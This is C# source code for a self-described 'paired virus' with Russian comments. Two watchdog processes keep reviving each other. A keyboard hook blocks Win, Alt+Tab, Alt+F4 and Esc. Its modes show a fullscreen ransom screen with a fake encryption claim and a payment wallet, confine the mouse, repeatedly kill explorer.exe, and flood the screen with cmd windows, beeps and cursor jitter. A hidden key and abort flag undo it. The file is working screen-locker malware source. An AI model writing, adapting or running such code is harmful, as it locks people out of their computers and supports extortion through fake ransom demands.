// toxik.cs — нативный парный вирус на C#/.NET4 (csc без SDK).
// роли: a — работает, b — сторож и воскресает a. машинный abort гасит всех.
// вывод крюка: WIN/Alt+Tab/Alt+F4/ESC/Ctrl(+Shift)+Esc глотаются.
// поле ввода ключа: "0007" цифрами или слово "sos".
// job: winlock | trap | explorer | wall | madness    role: a | b
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Toxik
{
    internal static class Core
    {
        public static string Dir = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\');
        public static string Job = "winlock";
        public static string Role = "a";
        public static readonly string[] Jobs = { "winlock", "trap", "explorer", "wall", "madness" };
        public static volatile bool Freed = false;
        public static EventWaitHandle CodeEvent = new EventWaitHandle(false, EventResetMode.ManualReset);

        // ---------- флаги ----------
        public static string StopPath(string job) { return Path.Combine(Dir, "stop_" + job + ".flag"); }
        public static string AbortPath { get { return Path.Combine(Dir, "abort.flag"); } }
        public static bool Stopped { get { return File.Exists(StopPath(Job)) || File.Exists(AbortPath); } }
        public static void StopOwnJob()
        {
            try { File.WriteAllText(StopPath(Job), "x"); } catch { }
        }
        public static void AbortAll()
        {
            try { File.WriteAllText(AbortPath, "x"); } catch { }
            foreach (string j in Jobs) { try { File.WriteAllText(StopPath(j), "x"); } catch { } }
            Log("М-стоп от владельца: гашу всех");
        }

        // ---------- журнал ----------
        public static void Log(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Dir, "virus.log"),
                    "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + Job + "/" + Role + " " + msg + "\r\n",
                    System.Text.Encoding.UTF8);
            }
            catch { }
        }

        // ---------- pid/брат ----------
        public static string PidPath(string role) { return Path.Combine(Dir, Job + "_" + role + ".pid"); }
        public static void WritePid()
        {
            try { File.WriteAllText(PidPath(Role), Process.GetCurrentProcess().Id.ToString()); } catch { }
        }
        public static void DeletePid() { try { File.Delete(PidPath(Role)); } catch { } }
        public static bool PeerAlive()
        {
            string peer = Role == "a" ? "b" : "a";
            try
            {
                int pid = int.Parse(File.ReadAllText(PidPath(peer)).Trim());
                if (pid <= 0 || pid == Process.GetCurrentProcess().Id) return false;
                Process.GetProcessById(pid);
                return true;
            }
            catch { return false; }
        }
        public static void SpawnPeer()
        {
            string peer = Role == "a" ? "b" : "a";
            try
            {
                ProcessStartInfo si = new ProcessStartInfo();
                si.FileName = Process.GetCurrentProcess().MainModule.FileName;
                si.Arguments = Job + " " + peer;
                si.UseShellExecute = false;
                si.CreateNoWindow = true;
                Process.Start(si);
                Log("поднял брата " + peer);
            }
            catch (Exception e) { Log("брат не поднялся: " + e.Message); }
        }
        public static void Guardian()
        {
            Thread.Sleep(1200);          // даём брату успеть расписаться в пид-файле
            while (!Stopped)
            {
                // двойная проверка против гонки на старте — не плодим лишних
                if (!PeerAlive() && !PeerAlive()) SpawnPeer();
                Thread.Sleep(800);
            }
            DeletePid();
        }

        // ---------- апишки ----------
        [DllImport("user32.dll")]
        public static extern bool ClipCursor(IntPtr rect);

        [StructLayout(LayoutKind.Sequential)]
        internal struct RECT { public int L; public int T; public int R; public int B; }

        public static void ClipTo(Rectangle r)
        {
            RECT rc = new RECT();
            rc.L = r.Left;
            rc.T = r.Top;
            rc.R = r.Right;
            rc.B = r.Bottom;
            IntPtr p = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RECT)));
            try
            {
                Marshal.StructureToPtr(rc, p, false);
                ClipCursor(p);
            }
            finally
            {
                Marshal.FreeHGlobal(p);
            }
        }

        [DllImport("user32.dll")]
        public static extern bool SetProcessDPIAware();
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int SystemParametersInfoW(int action, int uiparam, string param, int ini);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vk);
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out Point pt);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LHookProc proc, IntPtr mod, int thread);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hh);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll")]
        private static extern int GetMessage(out MSG msg, IntPtr hwnd, int min, int max);
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")]
        private static extern void keybd_event(byte vk, byte scan, int flags, int extra);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int ptX;
            public int ptY;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }

        private delegate IntPtr LHookProc(int code, IntPtr wp, IntPtr lp);

        // ---------- восстановление ----------
        public static void RestoreCommon()
        {
            ClipCursor(IntPtr.Zero);
            try
            {
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    if (k != null) k.DeleteValue("DisableTaskMgr", false);
                }
            }
            catch { }
            try
            {
                string marker = Path.Combine(new DirectoryInfo(Dir).Parent.FullName, "orig_wall.txt");
                if (File.Exists(marker))
                {
                    string orig = File.ReadAllText(marker).Trim();
                    if (orig.Length > 0 && File.Exists(orig))
                        SystemParametersInfoW(0x14, 0, orig, 3);
                    File.Delete(marker);
                }
            }
            catch { }
        }

        // ---------- крюк ----------
        private static LHookProc _keepProc;
        private static IntPtr _hhook;
        private static readonly StringBuilder _ring = new StringBuilder();

        public static IntPtr HookProc(int code, IntPtr wp, IntPtr lp)
        {
            if (code >= 0)
            {
                try
                {
                    KBDLLHOOKSTRUCT k =
                        (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
                    int evt = unchecked((int)wp.ToInt64());
                    bool down = (evt == 0x0100 || evt == 0x0104);
                    int vk = k.vkCode;
                    bool alt = (GetAsyncKeyState(0x12) & 0x8000) != 0;
                    bool ctrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;
                    if (vk == 0x5B || vk == 0x5C) return (IntPtr)1;              // WIN
                    if (vk == 0x09 && (alt || ctrl)) return (IntPtr)1;           // Alt+Tab / Ctrl(+Shift)+Esc
                    if (vk == 0x73 && alt) return (IntPtr)1;                     // Alt+F4
                    if (vk == 0x1B) return (IntPtr)1;                            // ESC
                    if (down && ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x60 && vk <= 0x69)))
                    {
                        _ring.Append((char)('0' + vk % 10));
                        if (_ring.Length > 8) _ring.Remove(0, _ring.Length - 8);
                        if (_ring.ToString().EndsWith("0007", StringComparison.Ordinal))
                        {
                            Log("код 0007 по крюку");
                            Freed = true;
                            CodeEvent.Set();
                            Thread t = new Thread(AbortAll);
                            t.IsBackground = true;
                            t.Start();
                            return (IntPtr)1;
                        }
                        // прочие цифры НЕ глотаем — они должны доехать до поля ввода
                    }
                }
                catch (Exception e) { Log("hook глюк: " + e.Message); }
            }
            return CallNextHookEx(IntPtr.Zero, code, wp, lp);
        }

        public static void HookWorker()
        {
            _keepProc = HookProc;                         // держим делегат навсегда
            _hhook = SetWindowsHookEx(13, _keepProc, GetModuleHandle(null), 0);
            if (_hhook == IntPtr.Zero)
            {
                Log("крюк не встал — ключ ходит через поле");
                return;
            }
            MSG m;
            while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0)
            {
                if (CodeEvent.WaitOne(0) || Freed || Stopped) break;
            }
            UnhookWindowsHookEx(_hhook);
            _hhook = IntPtr.Zero;
            Log("крюк снят");
        }

        // ---------- джобы ----------
        public static void WallRunner()
        {
            string wall = Path.Combine(Dir, "wall.png");
            while (!Stopped && !Freed)
            {
                if (File.Exists(wall))
                {
                    try { SystemParametersInfoW(0x14, 0, wall, 3); }
                    catch { }
                }
                Thread.Sleep(3000);
            }
            RestoreCommon();
        }

        public static void ExplorerRunner()
        {
            while (!Stopped && !Freed)
            {
                try
                {
                    ProcessStartInfo si = new ProcessStartInfo("taskkill", "/f /im explorer.exe");
                    si.UseShellExecute = false;
                    si.CreateNoWindow = true;
                    Process.Start(si);
                }
                catch { }
                Thread.Sleep(1500);
            }
            RestoreCommon();
            StartExplorer();
        }

        public static void MadnessRunner()
        {
            Random rnd = new Random();
            while (!Stopped && !Freed)
            {
                int n = 2 + rnd.Next(4);
                for (int i = 0; i < n; i++)
                {
                    try
                    {
                        ProcessStartInfo si = new ProcessStartInfo("cmd.exe");
                        si.Arguments = "/k color 4F&title ЗОНА ВИРУСА&echo ХОЗЯИН ЭТОЙ МАШИНЫ БОЛЬШЕ НЕ ТЫ&ping -n 99999 127.0.0.1 >nul";
                        si.UseShellExecute = true;
                        Process.Start(si);
                    }
                    catch { }
                    Thread.Sleep(220);
                }
                for (int i = 0; i < 28; i++) keybd_event(0xAF, 0, 0, 0);
                keybd_event(0x14, 0, 0, 0);
                keybd_event(0x14, 0, 2, 0);
                try
                {
                    Point pt;
                    Core.GetCursorPos(out pt);
                    SetCursorPos(pt.X + rnd.Next(-70, 71), pt.Y + rnd.Next(-70, 71));
                    Console.Beep(750 + rnd.Next(0, 3) * 180, 280);
                }
                catch { }
                Thread.Sleep(1500);
            }
            RestoreCommon();
        }

        public static void StartExplorer()
        {
            try
            {
                Process.Start(new ProcessStartInfo("explorer.exe") { UseShellExecute = false });
            }
            catch { }
        }
    }

    // =========================================================
    //  DE.A.D.L.O.C.K — вечный экран + поле ввода ключа (0007 / sos)
    // =========================================================
    internal class DeadLockForm : Form
    {
        private TextBox _box;
        private Label _clock;
        private Label _note;
        private DateTime _t0 = DateTime.Now;
        private static readonly string[] tips = {
            "диспетчер задач? замурован",
            "alt+f4 уволился молча",
            "win? не слышали",
            "процессов двое — воскресают оба",
            "подсказок не будет",
            "начальник вернётся. или нет"
        };

        public DeadLockForm()
        {
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.Manual;
            Bounds = SystemInformation.VirtualScreen;   // все мониторы сразу
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = Color.FromArgb(5, 0, 0);
            KeyPreview = true;

            TableLayoutPanel t = new TableLayoutPanel();
            t.Dock = DockStyle.Fill;
            t.ColumnCount = 1;
            t.RowCount = 7;
            t.BackColor = Color.FromArgb(5, 0, 0);
            t.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100));
            t.RowStyles.Add(new RowStyle(SizeType.Percent, 13));   // шапка
            t.RowStyles.Add(new RowStyle(SizeType.Percent, 9));   // подзаголовок
            t.RowStyles.Add(new RowStyle(SizeType.Absolute, 270)); // QR
            t.RowStyles.Add(new RowStyle(SizeType.Percent, 12));  // плену
            t.RowStyles.Add(new RowStyle(SizeType.Percent, 15));  // кошелёк
            t.RowStyles.Add(new RowStyle(SizeType.Absolute, 80)); // поле
            t.RowStyles.Add(new RowStyle(SizeType.Percent, 10));  // шёпот
            Controls.Add(t);

            t.Controls.Add(BigLabel("☠ D E A D L O C K ☠", 42, FontStyle.Bold,
                Color.FromArgb(255, 26, 26)), 0, 0);
            t.Controls.Add(BigLabel("система захвачена · файлы зашифрованы · AES-256-CBC + RSA-4096",
                14, FontStyle.Regular, Color.FromArgb(216, 216, 216)), 0, 1);

            PictureBox qr = new PictureBox();
            qr.BackColor = Color.FromArgb(5, 0, 0);
            qr.Width = 250;
            qr.Height = 250;
            qr.Anchor = AnchorStyles.None;
            qr.Paint += delegate(object s, PaintEventArgs e)
            {
                Random rnd = new Random(1337);
                Graphics g = e.Graphics;
                for (int x = 0; x < 26; x++)
                    for (int y = 0; y < 26; y++)
                        if (rnd.Next(100) < 45)
                            g.FillRectangle(Brushes.Gainsboro, 4 + x * 9.4f, 4 + y * 9.4f, 8, 8);
            };
            t.Controls.Add(qr, 0, 2);

            _clock = BigLabel("в плену: 00:00:00", 30, FontStyle.Bold, Color.FromArgb(255, 26, 26));
            t.Controls.Add(_clock, 0, 3);

            t.Controls.Add(BigLabel(
                "кошелёк откупа: bc1qdeadlock0x82f1ab34\nсумма: 3000 ₽ · ключ придёт после оплаты",
                15, FontStyle.Regular, Color.FromArgb(255, 209, 102)), 0, 4);

            _box = new TextBox();
            _box.Font = new Font("Consolas", 20, FontStyle.Bold);
            _box.ForeColor = Color.FromArgb(57, 255, 20);
            _box.BackColor = Color.FromArgb(20, 0, 0);
            _box.BorderStyle = BorderStyle.FixedSingle;
            _box.Width = 340;
            _box.TextAlign = HorizontalAlignment.Center;
            _box.Anchor = AnchorStyles.None;
            _box.TextChanged += delegate { ParseKey(); };
            t.Controls.Add(_box, 0, 5);

            _note = BigLabel("_field placeholder_", 12, FontStyle.Regular, Color.FromArgb(122, 77, 77));
            t.Controls.Add(_note, 0, 6);

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 700;
            timer.Tick += delegate { Beat(); };
            timer.Start();
            Load += delegate { _box.Focus(); };
        }

        private static Label BigLabel(string text, int size, FontStyle st, Color c)
        {
            Label l = new Label();
            l.Text = text;
            l.Font = new Font("Consolas", size, st);
            l.ForeColor = c;
            l.BackColor = Color.Transparent;
            l.TextAlign = ContentAlignment.MiddleCenter;
            l.Dock = DockStyle.Fill;
            return l;
        }

        private void ParseKey()
        {
            try
            {
                if (_box.Text.Length == 0) return;
                string low = _box.Text.ToLower();
                if (_box.Text.IndexOf("0007", StringComparison.Ordinal) >= 0 || low.Contains("sos"))
                {
                    _box.Text = "";
                    Core.Log("ключ по полю");
                    Core.Freed = true;
                    Core.CodeEvent.Set();
                    Thread th = new Thread(Core.AbortAll);
                    th.IsBackground = true;
                    th.Start();
                }
            }
            catch { }
        }

        private void Beat()
        {
            if (Core.Stopped || Core.CodeEvent.WaitOne(0) || Core.Freed)
            {
                try
                {
                    _clock.Text = "КЛЮЧ ПРИНЯТ";
                    _clock.ForeColor = Color.FromArgb(57, 255, 20);
                    _note.Text = "владелец одумался. свобода.";
                    Core.Freed = true;
                    Close();
                }
                catch { }
                return;
            }
            _clock.Text = "в плену: " +
                (DateTime.Now - _t0).ToString(@"hh\:mm\:ss");
            _note.Text = tips[DateTime.Now.Second % tips.Length];
            TopMost = true;
            Activate();
            if (CanFocus) _box.Focus();
        }
    }

    // =========================================================
    //  JAIL — камера-клетка с полем (временная: сама отпускает через 10 мин)
    // =========================================================
    internal class JailForm : Form
    {
        private TextBox _box;
        private DateTime _cap;
        private Label _timer;

        public JailForm(DateTime cap)
        {
            _cap = cap;
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.Manual;
            Point pt;
            Core.GetCursorPos(out pt);
            int wx = Math.Max(10, Math.Min(pt.X - 150, Screen.PrimaryScreen.Bounds.Width - 310));
            int wy = Math.Max(10, Math.Min(pt.Y - 75, Screen.PrimaryScreen.Bounds.Height - 160));
            Bounds = new Rectangle(wx, wy, 300, 150);
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = Color.FromArgb(120, 0, 0);

            _box = new TextBox();
            _box.Font = new Font("Consolas", 15, FontStyle.Bold);
            _box.ForeColor = Color.FromArgb(57, 255, 20);
            _box.BackColor = Color.FromArgb(30, 0, 0);
            _box.BorderStyle = BorderStyle.FixedSingle;
            _box.Location = new Point(20, 95);
            _box.Width = 260;
            _box.TextAlign = HorizontalAlignment.Center;
            _box.TextChanged += delegate { Parse(); };

            Label head = new Label();
            head.Text = "🔒 мышь прикована";
            head.Font = new Font("Consolas", 12, FontStyle.Bold);
            head.ForeColor = Color.White;
            head.Dock = DockStyle.Top;
            head.TextAlign = ContentAlignment.MiddleCenter;
            head.Height = 65;

            _timer = new Label();
            _timer.Font = new Font("Consolas", 10);
            _timer.ForeColor = Color.FromArgb(255, 209, 102);
            _timer.TextAlign = ContentAlignment.MiddleCenter;
            _timer.Dock = DockStyle.Fill;

            Controls.Add(_timer);
            Controls.Add(head);
            Controls.Add(_box);
            head.BringToFront();
            _box.BringToFront();
            _box.Focus();

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 50;
            timer.Tick += delegate { Beat(); };
            timer.Start();

            FormClosing += delegate(object s, FormClosingEventArgs e)
            {
                if (!Core.Freed && DateTime.Now < _cap) e.Cancel = true;
            };
        }

        private void Parse()
        {
            if (_box.Text.Length == 0) return;
            string low = _box.Text.ToLower();
            if (_box.Text.IndexOf("0007", StringComparison.Ordinal) >= 0 || low.Contains("sos"))
            {
                _box.Text = "";
                Core.Log("ключ в клетке");
                Core.Freed = true;
                Core.AbortAll();
            }
        }

        private void Beat()
        {
            if (Core.Stopped)
            {
                Core.Freed = true;
                Close();
                return;
            }
            if (DateTime.Now >= _cap)
            {
                Core.Log("смена охраны: 10 мин отработаны, мышь отпущена");
                Core.StopOwnJob();
                Core.Freed = true;
                Close();
                return;
            }
            Core.ClipTo(this.Bounds);
            TopMost = true;
            _box.Focus();
            _timer.Text = "до отпуска: " + (int)(_cap - DateTime.Now).TotalMinutes + " мин";
        }
    }

    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            Core.SetProcessDPIAware();
            if (args.Length >= 1) Core.Job = args[0].Trim().ToLowerInvariant();
            if (args.Length >= 2) Core.Role = args[1].Trim().ToLowerInvariant();
            Core.WritePid();
            Core.Log("старт");

            Thread guard = new Thread(Core.Guardian);
            guard.IsBackground = true;
            guard.Start();

            if (Core.Role == "a" && (Core.Job == "winlock" || Core.Job == "trap"))
            {
                Thread hook = new Thread(Core.HookWorker);
                hook.IsBackground = true;
                hook.Start();
            }

            if (Core.Role == "a" && Core.Job == "winlock")
            {
                while (!Core.Stopped && !Core.Freed)
                {
                    try { Application.Run(new DeadLockForm()); }
                    catch { }
                    if (Core.Stopped || Core.Freed) break;
                    Thread.Sleep(200);
                }
                Core.RestoreCommon();
                Core.DeletePid();
                Core.Log("winlock свёрнут");
                return;
            }
            if (Core.Role == "a" && Core.Job == "trap")
            {
                DateTime cap = DateTime.Now.AddMinutes(10);
                while (!Core.Stopped && !Core.Freed && DateTime.Now < cap)
                {
                    try { Application.Run(new JailForm(cap)); }
                    catch { }
                    if (Core.Stopped || Core.Freed || DateTime.Now >= cap) break;
                    Thread.Sleep(200);
                }
                Core.RestoreCommon();
                Core.DeletePid();
                Core.Log("trap свёрнут");
                return;
            }
            if (Core.Role == "a" && Core.Job == "wall")
            {
                Core.WallRunner();
            }
            else if (Core.Role == "a" && Core.Job == "explorer")
            {
                Core.ExplorerRunner();
            }
            else if (Core.Role == "a" && Core.Job == "madness")
            {
                Core.MadnessRunner();
            }
            else
            {
                while (!Core.Stopped) Thread.Sleep(1000);
            }
            Core.DeletePid();
            Core.Log("протух");
        }
    }
}
